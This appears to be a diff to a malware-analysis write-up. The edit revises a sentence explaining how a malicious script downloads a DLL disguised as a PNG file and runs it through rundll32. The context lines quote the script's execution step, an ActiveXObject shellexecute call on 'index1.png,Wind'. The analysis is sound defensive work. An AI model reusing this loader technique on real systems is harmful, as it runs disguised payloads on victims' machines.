@@ -69,7 +69,7 @@ function sleep(millis){
    sleep(15000);
    var shell = new ActiveXObject("shell.application");shell.shellexecute("rundll32", "C:\\ProgramData\\index1.png,Wind", "", "open", 3);
 ```
-The Script is prety easy it's just downloading a file from a remoteserver and executing it using "rundll32" So it's downloading a dll file and passing the parameter "wind" to the rundll32 to specify the function that will be executed in that dll.
+The Script is prety easy it's just downloading a file from a remoteserver and executing it using "rundll32" So it's downloading a dll file and passing the parameter "wind" to the rundll32 also with a parameter to png file which may be for evasion reaasons.
 
 # Tricking method
 
